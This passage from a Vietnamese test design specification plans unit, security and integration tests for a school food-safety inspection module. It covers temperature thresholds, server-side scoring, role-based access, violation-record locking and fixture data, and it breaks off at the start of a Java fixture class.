| **L21** | CF-26 | **FE tính `score` rồi gửi lên**; mock chỉ so `score >= 60` ⇒ **client quyết định điểm** | BR-100/BR-104 phải enforce server-side | `MF07-TC-011` assert backend **tính lại `score` từ `itemResults`**, bỏ qua giá trị FE gửi (test gửi `score: 100` với `itemResults` chỉ 11/20 đạt → phải ra `55`), vẫn **trả về** `score` + `result`. |
| **L22** | CF-30 | Gate MSG-095 (bắt buộc ảnh bản ký trước khi đóng/gửi duyệt) **chỉ disable nút ở client** — gọi thẳng API là lách được | BR-211 ghi rõ đây là **gate chặn cứng** | `MF07-TC-020` + `MF07-TC-SEC-014` assert backend **chặn**: `resolution → APPROVED`/`PENDING_APPROVAL` khi `signed_record_photo_url` null → **409 `VIO-095`**. **Ưu tiên cao.** |

### 2.3. Nhóm C — field không có BR/UC nguồn (CF-10) — cách test

> ✅ **ĐÓNG 2026-08-03 — Huy chốt CHÍNH THỨC HOÁ.** 6 field của CF-10 nay có BR gốc trong `business_rules.md` **v2.1**: **BR-221** (`confirmStatus`, `recordCaterersRep`, `recordPdfExportedAt`, `recordSignedFiles` — UC-014) và **BR-222** (`medicalReviewResult/Reason/By/At` — UC-112). Mục này giữ lại theo Policy 4.4; nội dung bên dưới **đã lỗi thời**, đọc phần ✅ ở cuối.

~~**Policy test:** các field này được test ở mức **hợp đồng dữ liệu** (đọc/ghi đúng, phân quyền đúng theo §16) nhưng **KHÔNG** có TC nào gán cho chúng một mã BR/UC. Cột `Oracle Source` của các TC đó ghi rõ `TDS §5.2 + §16 (chưa có BR/UC nguồn — CF-10)`. Không tự cấp mã mới. Chờ Huy quyết định chính thức hoá hay descope.~~

**✅ Policy test SAU 2026-08-03 (thay bản gạch ngang ở trên):** 6 field nay có oracle thật.

| TC | Field | `Oracle Source` mới | Điều phải assert thêm vì BR nói rõ hơn file review |
|---|---|---|---|
| `MF07-TC-022` | `medicalReviewResult`/`Reason`/`By`/`At` | **BR-222** (UC-112) | (a) `medicalReviewResult = FAILED` mà thiếu `medicalReviewReason` → **422** (CHECK `ck_insp_medical_reason`); (b) ghi `medicalReviewResult = FAILED` **KHÔNG** làm `overall` đổi giá trị và **KHÔNG** làm `serving-gate` chuyển `allowed=false` — hai chỉ số song song; (c) **không** CAPA nào được sinh (khác BR-095) |
| `MF07-TC-023` | `confirmStatus`, `recordCaterersRep`, `recordPdfExportedAt`, `recordSignedFiles` | **BR-221** (UC-014) | (a) phiên mới nộp phải ở `AWAITING_CATERERS_CONFIRM`; (b) chưa xác nhận **KHÔNG** chặn `serving-gate`, **KHÔNG** đổi `score`/`result` — BR-221 ghi rõ đây **không phải cổng chặn**; (c) `recordCaterersRep` + `confirmedAt` được điền đúng tài khoản gọi `POST /kitchen-inspections/{id}/confirm`; (d) có bản ghi audit (BR-170) |
| `MF07-TC-SEC-009` | cả 2 nhóm | **BR-221 + BR-222** | Chỉ Medical Staff ghi được `medicalReview*`; chỉ Service Caterers gọi được `/confirm`. Gỡ ghi chú *"⚠️ ranh giới MF11 (L10)"* — nhóm field này chưa bao giờ thuộc MF11 |

> **Vì sao 3 TC này MẠNH LÊN chứ không chỉ đổi nhãn:** file review chỉ mô tả *field tồn tại*. BR-221/BR-222 mới là chỗ nói rõ **field đó KHÔNG được làm gì** — không chặn vận hành, không ghi đè `overall`, không sinh CAPA. Ba assertion "không" đó trước 03/08 **không có oracle nào chống lưng** nên không viết được; nay viết được, và chúng chính là thứ ngăn người sau "tiện tay" cho `medicalReviewResult` ghi đè `overall`.

**Cách xử lý mâu thuẫn trong test (policy — giống MF05):** nơi nào 2 nguồn nói khác nhau và chưa có người chốt → test **hành vi khoan dung** (accept cả hai) + để `@Disabled("Chờ CF-x")` cho TC của hành vi nghiêm ngặt. **Không** viết test khoá một bên rồi coi là chuẩn. Ngoại lệ: **L1–L4** đã có người chốt (`00_Common_Conventions.md` Approved bởi Nam) ⇒ test khoá theo D1–D7, không khoan dung.

---

## 3. Test Design Specification

### TDS-01 — Scope / Phạm vi

```
MF07 (com.sfms.mf07) — các layer được kiểm thử:
├── domain/       InspectionSession (aggregate root, ADR-M07-01)
│                 + Step1FreshRow, Step1DryRow, Step2Row, Step3Row (4 bảng dòng biểu mẫu)
│                 + KitchenInspection, ChecklistGroup/Item, ChecklistItemResult
│                 + ViolationRecord, SafetySignoff, InspectionEvidence
│                 + enum StepStatus{PENDING,PASSED,FAILED}, overall thêm IN_PROGRESS (CF-23)
│                 → pure logic: thứ tự bước, ngưỡng nhiệt độ, tính overall
├── service/      InspectionSessionService · ThreeStepValidator · Step1/2/3Validator
│                 ServingApprovalService (BR-094 — chốt chặn) · EvidenceValidator
│                 KitchenInspectionService · ChecklistScoringService
│                 ViolationRecordService · SafetyMonitoringService · ComplianceReportService
│                 → UNIT TEST: Mockito mock repository + InventoryQueryPort + ObjectStoragePort
├── web/          InspectionController · KitchenInspectionController
│                 ViolationController · ComplianceReportController · MonitoringController
│                 → SECURITY TEST: MockMvc + JWT giả lập (7 role) + row-level BR-099
└── integration/  @SpringBootTest + Testcontainers PostgreSQL 16 + Flyway V1..V11 (da merge) + V12/V13 (MF07)
                  → API → DB, CHECK constraint, audit log, serving-gate
```

**NGOÀI phạm vi (test ở module khác, chỉ **stub/seed** ở đây):**

| Thành phần | Chủ | Cách xử lý trong test MF07 |
|---|---|---|
| JWT/RBAC filter | MF01 (Nam) | JWT giả lập; **không** test thuật toán token |
| `SchoolRecord`, geofence | MF02 (Nam) | seed bảng; GPS verify = **no-op ở dev** (ADR-000) → `MF07-TC-006` test *ghi nhận* GPS server-side, không test độ chính xác geofence |
| `Partner` (bếp/đơn vị suất ăn) | MF04 (Mạnh) | seed `SUP-001`, `SUP-002` cho test row-level BR-099 |
| `Menu`/`dishId` | MF05 (Thảo) | seed `MENU-2026-30`, `dishId` thật |
| `InventoryBatch.expiryDate` | MF06 (Huy) | Mockito stub `InventoryQueryPort` — `MF07-TC-004` (lô hết hạn) |
| **CAPA / Corrective Action** | **MF11 (Minh)** | MF07 chỉ assert **phát event** `InspectionStepFailed` + CAPA được tạo qua port; **logic xử lý CAPA test ở MF11** |
| **Luồng phê duyệt xử lý vi phạm (UC-180/182, BR-186)** | **MF11 (Minh)** | **KHÔNG test ở đây** (L10/CF-6). MF07 chỉ test tạo/PDF/ảnh ký/khoá |
| CRUD checklist (UC-186, BR-207/210) | **MF12 (Thảo)** | MF07 chỉ **đọc** để chấm điểm; `MF07-TC-016` test soft-delete vì FK từ `checklist_item_results` nằm ở MF07 |
| Object storage (ảnh bằng chứng) | ADR-000 | `ObjectStoragePort` fake → `./data/uploads`; assert `url` + `sha256`, không assert nội dung ảnh |
| Sinh PDF | PDFBox | test **thật** (không stub) vì BR-211 đòi bản in đồng nhất — `MF07-TC-017` |

### TDS-02 — Test Basis / Cơ sở Kiểm thử

| Source | Items Derived |
|--------|--------------|
| `traceability_matrix.md` **§1.7** | 11 UC + tập BR/MSG hợp lệ (nguồn CHUẨN — không nhận mã ngoài bảng này) |
| `MF07_Food_Safety_Inspection_Monitoring.md` | Normal/Alternative Flow → bước nghiệp vụ của TC. ⚠️ UC-014 AF1 **đã descope** (L6) — không dùng làm oracle |
| `business_rules.md` §8 | **BR-079** đúng 3 bước theo Điều 3–5 QĐ 1246 · **BR-083** ảnh + GPS + timestamp · **BR-090** lõi ≥ 75°C · **BR-091** giữ ấm ≥ 60°C · **BR-092** tự kiểm HSD lô · **BR-093** hồ sơ hoàn chỉnh · **BR-094** không phục vụ nếu bước thất bại · **BR-095** trượt → CAPA tự động · **BR-096** tái kiểm tra · **BR-097** trượt nghiêm trọng → sự cố · **BR-098** 3 bước ĐẠT mới phê duyệt · **BR-099** scope xem hồ sơ |
| `business_rules.md` §12 | **BR-100** điểm vệ sinh hàng ngày · **BR-101** lưu kết quả định kỳ tháng · **BR-102** côn trùng = mục tùy chọn (27/07) · **BR-103** giấy sức khỏe nhân viên bếp · **BR-104** điểm vào Báo cáo Tuân thủ · BR-089 *(deprecated — L7)* |
| `business_rules.md` §18 | **BR-183** 1 loại biên bản, nhắm **đơn vị Nhà thầu** · **BR-211** export PDF → in → ký tay 2 bên → upload ảnh ký → khoá; thiếu ảnh ký = **gate chặn cứng** |
| `error_message.md` | Chuỗi assert nguyên văn: MSG-004, MSG-005, MSG-015, MSG-016, MSG-017, MSG-043, MSG-055, MSG-056, MSG-059, MSG-085, MSG-086, MSG-088, MSG-093, MSG-094, MSG-095 |
| `TDS-MF07_Backend.md` §10 | Error code: `INSP-004/005/015/016/017/056/059/079/083/091/092/093/094/098` · `VIO-085/088/095/211` |
| `TDS-MF07_Backend.md` §16 | Ma trận 7 role × 20 nhóm endpoint **+ bảng phân quyền theo FIELD** (6 nhóm field) → 16 security TC |
| `TDS-MF07_Backend.md` §17.1 | C1–C14 → mỗi constraint ≥ 1 TC (chống AP-AI-001) |
| **`00_Common_Conventions.md` D1–D7** | Định danh, envelope lỗi, path, ISO ngày, id client, enum chung, ngôn ngữ message → L1–L4 + TC-024, TC-025 |
| `semantic-audit.ts` §7 | Luật **`PHAT_SUAT_DU_KIEM_THUC_TRUOT`** (phiên `overall` khớp `/KHÔNG ĐẠT|FAIL/i` mà cùng ngày có bản ghi `status="SERVED"`) |
| `00_Team_Work_Assignment_Plan.md` §2b | Shape 5 field · clamp `page` · tập rỗng vẫn 200 · `search` chỉ trên `SEARCH_FIELDS` · `dateFrom`/`dateTo` trên cột `date` (§2b-5) · `step`/`stepStatus` *(L—CF-17: chưa có FE dùng, vẫn phải hỗ trợ)* |
| **QĐ 1246/QĐ-BYT Điều 3–5** | 3 mẫu biểu khác nhau (Mẫu 1 nguyên liệu / Mẫu 2 chế biến / Mẫu 3 trước khi ăn); đồng ký sau khi hoàn tất → `MF07-TC-001`, `TC-010`, `TC-INT-001` |
| **Luật ATTP 55/2010/QH12** + §4.2 TDS | Hồ sơ kiểm thực là hồ sơ pháp lý → **cấm xoá**; `DELETE /inspections/{code}` phải bị chặn → `MF07-TC-SEC-013` |
| PDPD (Luật 91/2025) | Ảnh bằng chứng + `caterersRepresentativeId` → `MF07-TC-SEC-010` (pre-signed URL), `MF07-TC-SEC-011` (log không lộ định danh) |
| `ADR-000.md` | Dev = stub: GPS no-op, object storage `./data/uploads` |

### TDS-03 — Test Conditions and Coverage Items

| Condition ID | Test Condition | Coverage Item | Constraint | Test Cases |
|-------------|---------------|---------------|-----------|-----------|
| `COND-01` | 3 bước phải theo đúng thứ tự; Bước 3 khoá tới khi Bước 2 `PASSED` | `ThreeStepValidator.assertStepOrder()` | C1 | `TC-001`, `TC-002` |
| `COND-02` | Bước 2: `coreTemp >= 75` (dùng `>=`, không `>`) | `Step2Validator` | C2 | `TC-003`, `TC-004` |
| `COND-03` | Bước 3: `holdingTemp >= 60` | `Step3Validator` | C2 | `TC-005` ⚠️ blocked L19 |
| `COND-04` | Bước 1 tự kiểm HSD lô nguyên liệu | `Step1Validator` + `InventoryQueryPort` | C2 | `TC-006` *(BR-092)* |
| `COND-05` | Dòng/mục "Không đạt" bắt buộc ảnh + lý do; GPS/timestamp **server-side** | `EvidenceValidator` + CHECK `ck_s1f_evidence` | C5 | `TC-007`, `TC-015`, `TC-INT-012` |
| `COND-06` | Bước trượt → ghi non-conformance + **backend tự tạo CAPA** trong cùng transaction | `InspectionSessionService.submitStep()` + event | C3, C13 | `TC-008`, `TC-INT-008` |
| `COND-07` | Tái kiểm tra = phiên **MỚI**, phiên cũ không đổi | `reinspect()` | C3 | `TC-009`, `TC-INT-014` |
| `COND-08` | `overall = PASSED` **chỉ khi** 3 bước PASSED **và** đã đồng ký | `ServingApprovalService.approve()` | C1 | `TC-010`, `TC-INT-001` |
| `COND-09` | `serving-gate` là chốt chặn duy nhất cho MF09 | `GET /inspections/serving-gate` | C4 | `TC-INT-002`, `TC-INT-003`, `TC-SEC-015`, `TC-E2E-001` |
| `COND-10` | Điểm bếp tính **server-side** từ `itemResults`, bỏ qua số FE gửi | `ChecklistScoringService.score()` | C11 | `TC-011` |
| `COND-11` | `score < 60` → `FAILED` + cảnh báo MSG-093; **KHÔNG** khóa bếp | `KitchenInspectionService` | C6 | `TC-012`, `TC-013`, `TC-014`, `TC-INT-009` |
| `COND-12` | Biên bản vi phạm nhắm **ĐƠN VỊ**; API từ chối field cá nhân deprecated | `ViolationRecordService.create()` | C7 | `TC-019` |
| `COND-13` | Biên bản thiếu mô tả/ảnh → `VIO-085` | `ViolationRecordService.create()` | C7 | `TC-016b` *(xem TC-018b)* |
| `COND-14` | Dò tái diễn 90 ngày **server-side** theo `caterersRepresentativeId` | `findRepeatCandidates()` | C11 | `TC-018` |
| `COND-15` | BR-211 chuỗi bắt buộc: export PDF → upload ảnh ký → **khoá** | `export()/uploadSignedRecord()` | C7 | `TC-017`, `TC-020`, `TC-INT-011` |
| `COND-16` | Gate MSG-095 chặn cứng ở server, không chỉ disable nút | `ViolationRecordService` | C7, C13 | `TC-020`, `TC-SEC-014` |
| `COND-17` | Xoá checklist = **ẩn**; đã tham chiếu → 409 + MSG-094 | `ChecklistGroupService.delete()` | C14 | `TC-016`, `TC-INT-010` |
| `COND-18` | Row-level BR-099: Caterer chỉ đọc phiên đơn vị mình | `@PreAuthorize` + filter `partner_id` | C8 | `TC-021b`, `TC-SEC-005`, `TC-INT-004` |
| `COND-19` | Phân quyền **theo FIELD** trong body (6 nhóm field §16) | controller + service | C10 | `TC-SEC-008`, `TC-SEC-009` |
| `COND-20` | `PUT` là partial merge, không replace (mất `step*Rows`) | `InspectionSessionService.update()` | C9 | `TC-INT-006` |
| `COND-21` | JSON `id` = `code`, PK UUID (**D1**) | entity + `@JsonProperty("id")` | **D1** | `TC-INT-016`, mọi TC-INT-* |
| `COND-22` | JSON ngày **ISO-8601** (**D4** ghi đè C12) | `MenuMapper`-tương đương của MF07 | **D4**, L3 | `TC-024` |
| `COND-23` | `meal` = `BREAKFAST\|LUNCH\|SNACK` (**D6** ghi đè C12) | enum `common/enums/MealType` | **D6**, L4 | `TC-025` |
| `COND-24` | Envelope lỗi `{"error":{...}}` (**D2**) | `@RestControllerAdvice` | **D2**, L2 | mọi TC error path |
| `COND-25` | Nhận `id` client, trùng → 409 (**D5**) | `create()` | **D5** | `TC-026` |
| `COND-26` | Hồ sơ kiểm thực **cấm xoá** (QĐ 1246, Luật ATTP) | `DELETE /inspections/{code}` | §4.2 TDS | `TC-SEC-013` |
| `COND-27` | Hợp đồng phân trang 5 field, clamp `page`, rỗng vẫn 200 | `PagedResponse.of()` | `00_` §2b | `TC-INT-005`, `TC-INT-005b` |
| `COND-28` | Filter `dateFrom`/`dateTo` trên cột `date`; `step`+`stepStatus` | `InspectionSpec.build()` | `00_` §2b-2/2b-5 | `TC-INT-007` |
| `COND-29` | `search` chỉ trên `SEARCH_FIELDS` khai ở §9.2 | `InspectionSpec` | `00_` §2b-3 | `TC-INT-005c` |
| `COND-30` | Compliance report đúng **5 slug** như mock | `ComplianceReportService.generate()` | — (§14.3 TDS) | `TC-INT-017` |
| `COND-31` | Audit log đủ actor + IP cho mọi thao tác ghi (BR-170/188) | audit aspect | §4.3 TDS | `TC-INT-018` |
| `COND-32` | `overall` (cột lưu, ADR-M07-02) **nhất quán** với 3 cột bước | CHECK/query §14.1 | ADR-M07-02 | `TC-INT-019` |
| `COND-33` | Truy vết ngược: biên bản có `sourceInspectionId` → phiên trả kèm `violations[]` | `InspectionQueryService.detail()` | BR-183 | `TC-INT-020`, `TC-E2E-002` |
| `COND-34` | Không JWT → 401; sai role → 403 trên toàn bộ endpoint | filter chain | **D2**, §16 | `TC-SEC-001`…`TC-SEC-007` |
| `COND-35` | `schoolId`/`partnerId` lấy **từ JWT**, không tin query param | `SecurityContext` → Spec | C8 | `TC-SEC-006` |
| `COND-36` | Ảnh bằng chứng chỉ truy cập qua **pre-signed URL** | `ObjectStoragePort` | ADR-M07-04, PDPD | `TC-SEC-010` |
| `COND-37` | Log **không** lộ định danh nhân viên/đại diện Nhà thầu | logger + mapper | PDPD, BR-183 (26/07) | `TC-SEC-011` |
| `COND-38` | Ảnh biên bản đã ký có `sha256` — chống sửa bằng chứng | `uploadSignedRecord()` | ADR-M07-04 | `TC-SEC-012` |
| `COND-39` | MSG-055/059 chỉ phát khi **nhập tay** ngoài dải, không giám sát tự động | `KitchenInspectionService` | L7/CF-3 | `TC-021` |
| `COND-40` | `medicalReview*` — 4 field DUY NHẤT Y tế ghi được trên `inspections` | field-level authz | C10, CF-10 | `TC-022`, `TC-SEC-009` |
| `COND-41` | `confirmStatus` chỉ Service Caterers (đơn vị bị kiểm) ghi được | field-level authz | C10, CF-10 | `TC-023` |
| `COND-42` | `description` biên bản là HTML → phải **sanitize** (chống XSS) | `ViolationRecordService` | CF-27 | `TC-SEC-016` |

**Tổng:** 42 condition → 67 test case. Mỗi condition có ≥ 1 TC ⇒ **không có condition mồ côi** (kiểm ở §6).

### TDS-04 — Test Techniques / Kỹ thuật Kiểm thử

| Technique (ISO 29119-4) | Applied To | Rationale |
|------------------------|------------|-----------|
| **Boundary Value Analysis** | `coreTemp` ∈ {74, **75**, 76} · `holdingTemp` ∈ {59, **60**, 61} · `score` ∈ {59, **60**, 61} · cửa sổ tái diễn ∈ {89, **90**, 91} ngày · `page` ∈ {1, pageCount, pageCount+1} | BR-090/091 nói "≥ 75°C"/"≥ 60°C" và mock ghi `passed = score >= 60`. **Off-by-one ở đây là lỗi có hậu quả sức khỏe**: dùng `>` thay `>=` sẽ chặn oan bữa ăn đạt chuẩn 75°C, còn dùng `>=` sai chiều sẽ cho qua bữa 74°C |
| **State Transition Testing** | FSM phiên kiểm thực: `IN_PROGRESS → (step1/2/3) → PASSED\|FAILED`, kể cả transition không hợp lệ (nộp Bước 3 khi Bước 2 `PENDING`) · FSM biên bản: `PENDING → PENDING_APPROVAL → APPROVED\|REJECTED` + trạng thái **Đã khoá** sau ảnh ký | BR-079 là ràng buộc **thứ tự**, và ADR-M07-05 làm biên bản **append-only** — cả hai chỉ test được bằng bảng chuyển trạng thái |
| **Decision Table Testing** | `serving-gate` (có phiên? × `overall` × điểm bếp) → `allowed` + `reasonCode` · phân quyền **theo FIELD** (6 nhóm field × 7 role, §16) | `serving-gate` có 3 biến đầu vào và là chốt chặn duy nhất — bảng quyết định là cách duy nhất chứng minh không sót ô. Ca then chốt: **điểm bếp 40 nhưng kiểm thực PASSED ⇒ vẫn `allowed=true`** (C6) |
| **Equivalence Partitioning** | Vai trò theo BR-099: {Medical, SchoolAdmin} = toàn trường · {Caterer} = `Own` · {Teacher, Parent, Supplier} = không truy cập · `dietaryType`-tương đương: `severity` ∈ {LOW} vs {MEDIUM, HIGH} (BR-186 phân nhánh người duyệt) | BR-099 chia miền truy cập thành 3 lớp rõ rệt |
| **Error Guessing** | Bỏ JWT · đổi `schoolId`/`partnerId` trong query · Caterer A đọc phiên của B · gọi thẳng API để lách gate MSG-095 (nút bị disable) · `PUT` sửa `overall` trực tiếp · `DELETE` hồ sơ kiểm thực · truy cập ảnh bằng chứng bằng URL đoán được | Các lỗ hổng này **đều đã hiện diện** trong mock (L17, L22) — không phải giả thuyết |
| **Use Case Testing** | E2E-01 trục xương sống (kiểm thực ĐẠT → phát suất được; FAILED → không phát được) · E2E-02 vi phạm từ kiểm thực (bước trượt → CAPA → biên bản → PDF → ảnh ký → khoá) | `00_` §3 yêu cầu trục xương sống nối thông bằng ID; BR-094 là mắt nối MF07↔MF09 |
| **Contract Testing** | Shape response vs `mock-server.ts` + 17 tên field bất biến (C12) + 5 slug compliance-report + shape phân trang | Đổi tên field là 22 file FE gãy; §14.3 TDS đã đặt sẵn lệnh kiểm |
| **Data-driven (Parameterized)** | Ma trận 7 role × 29 endpoint (§16) · 5 `StepStatus` × 3 bước · bảng field-level 6 nhóm | 203 tổ hợp cho ma trận role — viết tay là bất khả thi |
| **Constraint-based (DB)** | CHECK `ck_insp_holding_temp`, `ck_s1f_evidence`, `ck_cir_evidence`, CHECK `overall` gồm `IN_PROGRESS` | §4.2 + C2 đòi enforce ở **cả** service **và** DB — hai lớp phải test riêng, vì service có thể bị bypass bởi migration/script |

### TDS-05 — Test Data Requirements

> **Nguồn fixture: `mock-data.ts` — dùng ID THẬT của seed.** Trường QA = `SCH-001`, đơn vị suất ăn = `SUP-001`.
> Fixture dựng bằng **Java builder** trong `InspectionTestFixtures.java`; seed DB bằng `@Sql` hoặc Flyway test migration.
> ⚠️ Theo **D1**, các giá trị `INSP-…`/`KIN-…`/`VIO-…` dưới đây là **`code`**, không phải PK.

| Fixture ID | Type | Value / Logic | Mục đích |
|-----------|------|---------------|---------|
| `FX-001` | DB seed `inspection_sessions` | `code="INSP-20260724-L"` — `date=2026-07-24`, `meal=LUNCH`, `step1/2/3=PASSED`, `overall=PASSED`, `coreTemp=82`, `inspector="Trần Văn Hùng"`, `coSigner="Ngô Thị Hà (Y tế)"`, `dish="Gà rang gừng"` | Phiên **ĐẠT** hoàn chỉnh — `serving-gate` mở (`TC-INT-002`), nguồn của `TC-E2E-001` nhánh dương |
| `FX-002` | DB seed `inspection_sessions` | `code="INSP-20260707-L"` — `step1=PASSED`, **`step2=FAILED`**, `step3=PENDING`, `overall=FAILED`, **`coreTemp=68`**, `dish="Cá basa sốt cà chua"` | Phiên **TRƯỢT** ở Bước 2 vì nhiệt độ lõi — oracle của `TC-003` (68 < 75), `TC-INT-003` (gate chặn), `TC-009` (tái kiểm), `TC-E2E-002` (nâng thành biên bản) |
| `FX-003` | DB seed `inspection_sessions` | `code="INSP-TD-S"` — `date=today`, `meal=SNACK`, 3 bước `PENDING`, **`overall=IN_PROGRESS`**, `dish="Chuối tây"` | Phiên **đang mở** — oracle của CF-23 (`IN_PROGRESS` là giá trị thứ 4), `TC-002` (nộp Bước 3 khi Bước 2 PENDING) |
| `FX-004` | DB seed `inspection_sessions` | `code="INSP-20260710-L"` — `overall=PASSED`, `coreTemp=80`, `inspector="Lê Thị Mai"` | Phiên thứ hai ĐẠT — dùng cho phân trang, filter khoảng ngày |
| `FX-005` | DB seed `inspection_sessions` | Phiên của **`SUP-002`** (dựng mới, `code="INSP-20260724-L2"`) | Cross-tenant BR-099 — `TC-SEC-005`, `TC-INT-004` |
| `FX-006` | DB seed `step2_rows` | Dòng Bước 2 với `coreTemp=75` (mốc biên **on-point**) | `TC-004` — biên `>=`, phải PASSED |
| `FX-007` | DB seed `step1_fresh_rows` | Dòng `sensoryPass=false`, **`photoCount=0`** | Vi phạm BR-083 → `INSP-083` + CHECK `ck_s1f_evidence` (`TC-007`) |
| `FX-008` | Stub `InventoryQueryPort` | Lô `BATCH-MP-8820` với `expiryDate` **trước** `session.date` | Lô hết hạn ở Bước 1 → `INSP-092` (`TC-006`) |
| `FX-009` | DB seed `kitchen_inspections` | `code="KIN-2026-016"` — `date=2026-05-28`, `type="Đột xuất"`, **`score=55`**, `inspector="Ngô Thị Hà"`, `pestControlValid=true`, **`staffHealthValid=false`**, `result="FAILED"`, có `itemFindings` | Điểm bếp **dưới ngưỡng** — oracle của `TC-012` (55 → FAILED + MSG-093), `TC-014` (KHÔNG khóa bếp), `TC-INT-009` |
| `FX-010` | DB seed `kitchen_inspections` | `code="KIN-2026-018"` — `score=92`, `result="PASSED"` · và `KIN-2026-017` `score=88` | Điểm bếp đạt — đối chứng |
| `FX-011` | DB seed `kitchen_inspections` | Dựng mới `score=60` (mốc biên) | `TC-013` — `passed = score >= 60`, biên phải PASSED |
| `FX-012` | DB seed `checklist_groups` + `checklist_items` | `CLG-1`…`CLG-4` với các mục `CLI-1-1`, `CLI-1-2`, `CLI-2-1`, `CLI-2-2`, **`CLI-3-8`**, **`CLI-4-6`** (2 mục côn trùng theo BR-102 27/07) — nguyên văn `mock-data.ts:2231+`, kèm `legalNote` | Nền chấm điểm (`TC-011`), soft-delete (`TC-016`), côn trùng qua mục checklist (L9) |
| `FX-013` | DB seed `checklist_item_results` | Kết quả của `KIN-2026-016`: **11/20 mục đạt** → điểm đúng phải là **55** | Oracle của `TC-011` — backend tính lại, bỏ qua `score` FE gửi |
| `FX-014` | DB seed `violation_records` | `code="VIO-2026-008"` — `subject="Khu sơ chế — không tách thớt sống/chín"`, `recordedBy="Ngô Thị Hà (Y tế)"`, `date=2026-06-30`, `severity=MEDIUM`, `resolution=PENDING_APPROVAL`, `status=OPEN`, **có `sourceInspectionId`** | Biên bản có **truy vết ngược** — `TC-INT-020`, `TC-E2E-002` |
| `FX-015` | DB seed `violation_records` | `code="VIO-2026-007"` — `type="Nhân sự"`, **`staffName`** đã set, `resolution=APPROVED`, `status=CLOSED` | **Dữ liệu lịch sử** với field deprecated (L11/CF-7) — đọc được, nhưng API tạo mới phải từ chối (`TC-019`) |
| `FX-016` | DB seed `violation_records` | `code="VIO-2026-009"` — `subject="Bỏ qua bước ghi nhiệt độ lõi khi kiểm thực Bước 2"`, `severity=MEDIUM`, `date=2026-06-28`, cùng `caterersRepresentativeId` với `VIO-2026-008` | 2 biên bản MEDIUM cùng đại diện, cách **2 ngày** → dò tái diễn 90 ngày (`TC-018`) |
| `FX-017` | DB seed `violation_records` | Dựng mới: `resolution=PENDING`, **`signed_record_photo_url = NULL`**, `pdf_exported = false` | Gate MSG-095 (`TC-020`) và VIO-211 (`TC-017`) |
| `FX-018` | DB seed `safety_signoffs` | 1 bản ghi ký của School Admin kèm snapshot `hygieneScore`, `failedSteps` (CF-32) | UC-027 — `TC-INT-018` |
| `FX-019` | DB seed `student_distributions` | Bản ghi `status="SERVED"` cùng ngày với `FX-002` (phiên FAILED) | Oracle của luật `PHAT_SUAT_DU_KIEM_THUC_TRUOT` (`TC-027`) — dữ liệu **vi phạm cố ý** để test phát hiện được |
| `FX-020` | JWT | `{sub:"caterer-001", role:"service-caterers", schoolId:"SCH-001", partnerId:"SUP-001"}` | Actor kiểm thực hợp lệ (`RoleKey` kebab-case theo **D6**) |
| `FX-021` | JWT | `{sub:"caterer-002", role:"service-caterers", schoolId:"SCH-001", partnerId:"SUP-002"}` | Caterer **khác đơn vị** → BR-099 cross-tenant (`TC-SEC-005`) |
| `FX-022` | JWT | `{sub:"medical-001", role:"medical-staff", schoolId:"SCH-001"}` | Actor kiểm bếp (UC-014) + `medicalReview*` |
| `FX-023` | JWT | `{sub:"admin-001", role:"school-admin", schoolId:"SCH-001"}` | UC-027 ký xác nhận + đồng ký đại diện Nhà trường |
| `FX-024` | JWT | `{role:"teacher", classId:"3A"}` · `{role:"parent"}` · `{role:"supplier"}` · `{role:"system-admin"}` | Đủ 7 role cho ma trận §16 (`TC-SEC-007`) |
| `FX-025` | Fake port | `ObjectStoragePort` fake → `./data/uploads`; trả `url` + `sha256` thật (tính từ bytes) | Ảnh bằng chứng (`TC-007`, `TC-SEC-010`, `TC-SEC-012`) |
| `FX-026` | Fake port | `GeoLocationPort` fake — **no-op** theo ADR-000 (dev) | `TC-006`/`TC-015` chỉ assert GPS được **ghi server-side**, không assert độ chính xác |
| `FX-027` | File | `00_Policies/specialreport2173_1.md` — mẫu biên bản | Oracle cấu trúc PDF (`TC-017`) |
| `FX-028` | env | `spring.profiles.active=test`, `SFMS_JWT_SECRET=test-secret-32-chars-minimum-len`, `SFMS_UPLOAD_DIR=./target/test-uploads` | Cấu hình test |
| `FX-029` | Testcontainer | `PostgreSQLContainer("postgres:16-alpine")` + Flyway `V1`…`V11` (MF01…MF06 đã merge) + `V12`/`V13` (MF07) | Nền integration test; timeout khởi động 120s |
| `FX-030` | DB seed `menus` (MF05) | `MENU-2026-30` `PUBLISHED` + `dishId="ca-basa-sot-ca-chua"` | FK `menu_id`/`dish_id` của BR-093 (hồ sơ hoàn chỉnh) |

**Nguyên tắc cách ly dữ liệu:** mỗi integration test `@Transactional` + rollback, **hoặc** `@Sql("/fixtures/mf07-reset.sql", executionPhase=BEFORE_TEST_METHOD)`.
⚠️ **Ngoại lệ quan trọng:** `TRUNCATE` trong test **chỉ** áp cho DB test của Testcontainers. Trên môi trường có dữ liệu thật, hồ sơ kiểm thực là **hồ sơ pháp lý QĐ 1246 — cấm xoá** (xem §7 Rollback R1).

---

## 4. Test Case Specification

> **TC ID format:** `MF07-TC-[NNN]` (unit) · `MF07-TC-SEC-[NNN]` (security) · `MF07-TC-INT-[NNN]` (integration) · `MF07-TC-E2E-[NNN]`
> **Severity:** CRITICAL / HIGH / MEDIUM / LOW (theo CVSS)
> **Status:** 🔴 Not written / 🟡 Written-failing / 🟢 Passing
> **Oracle Source:** bắt buộc — chỉ nhận BR / UC bước / MSG / điều luật (QĐ 1246, Luật ATTP) / luật `semantic-audit.ts` / hằng trong mock / **D1–D7**.
> **Assert lỗi:** theo **D2** — `$.error.code` + `$.error.message` (tiếng Anh nguyên văn `error_message.md`, theo **D7**).

### Fixture Isolation Boilerplate (CASE 2.0 — bản Java)

> ⭐ **CASE 2.0 Rule:** mỗi test tạo instance **mới** qua factory. Không shared mutable state (chống **AP-AI-002**).
> ⚠️ Theo **D1**: builder set `code` (mã nghiệp vụ), **không** set `id` (UUID do JPA sinh).

```java
package com.sfms.mf07;

import com.sfms.common.enums.MealType;
import com.sfms.mf07.domain.*;
import java.time.LocalDate;
import java.util.function.Consumer;

/**
 * Fixture factory cho MF07 — baseline đồng bộ FX-001…FX-030 (§3 TDS-05).
 * D1: code = mã nghiệp vụ; id (UUID) do JPA sinh, KHÔNG set tay.
 * MỌI test gọi newSession()/newKitchenInspection() để có instance RIÊNG.
 */
public final class InspectionTestFixtures {

    public static final String SCHOOL_ID  = "SCH-001";
    public static final String PARTNER_A  = "SUP-001";
    public static final String PARTNER_B  = "SUP-002";
    public static final String INSPECTOR  = "Trần Văn Hùng";

    /** Baseline = FX-003 (phiên đang mở, 3 bước PENDING, overall IN_PROGRESS). */
